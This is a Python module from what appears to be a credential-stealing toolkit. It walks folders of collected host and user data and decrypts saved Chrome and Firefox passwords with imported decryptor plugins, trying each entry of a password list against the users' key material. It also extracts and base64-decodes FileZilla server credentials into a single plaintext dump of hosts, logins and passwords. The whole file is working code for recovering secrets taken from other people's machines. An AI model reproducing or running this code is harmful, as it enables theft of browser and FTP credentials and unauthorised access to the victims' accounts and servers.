import os
import pathlib
from plugins.chrome_v80_password_offline import Chrome_decryptor
from plugins.firepwd import Firefox_decryptor
import xml.etree.ElementTree as ET
from base64 import b64decode


class Decrypt:
    def __init__(self, folder, book):
        super(Decrypt, self).__init__()
        self.folder = folder
        self.book = book

    def Decryptor(self):
        SSID = []
        data = ''
        for folders in os.listdir(self.folder):
            if os.path.isdir(f'{self.folder}/{folders}'):
                path_host = self.folder + f'/{folders}/'
                for folder in os.listdir(path_host):
                    if os.path.isdir(path_host + folder):
                        path_user = path_host + folder

                        for i in os.listdir(f'{path_user}/user_ssid'):
                            if os.path.isdir(f'{path_user}/user_ssid/{i}'):
                                SSID.append([i, f'{path_user}/user_ssid/{i}'])

                        for i in os.listdir(f'{path_user}/Chrome'):
                            if os.path.isdir(f'{path_user}/Chrome/{i}'):
                                for g in SSID:
                                    for k in self.book:
                                        data += Chrome_decryptor(f'{path_user}/Chrome', i, g[1], k, g[0])

                        for i in os.listdir(f'{path_user}/FireFox'):
                            if os.path.isdir(f'{path_user}/FireFox/{i}'):
                                for g in self.book:
                                    data += Firefox_decryptor(g, f'{pathlib.Path().absolute()}/{path_user}/FireFox/{i}')

                        filezilla_xml = ET.parse(f'{path_user}/FileZilla/recentservers.xml')
                        root = filezilla_xml.getroot()
                        data += f'\nFileZilla credentials\n{"*" * 50}\n'
                        for i in root[0]:
                            if i.tag == 'Server' and i[4].tag == 'User' and i[5].tag == 'Pass':
                                data += f'Host IP: {i[0].text}\nPort: {i[1].text}\nLogin: {i[4].text}\nPassword: {b64decode(i[5].text).decode("UTF-8")}\n\n'
                        data += f'{"*" * 50}\n'
        return data
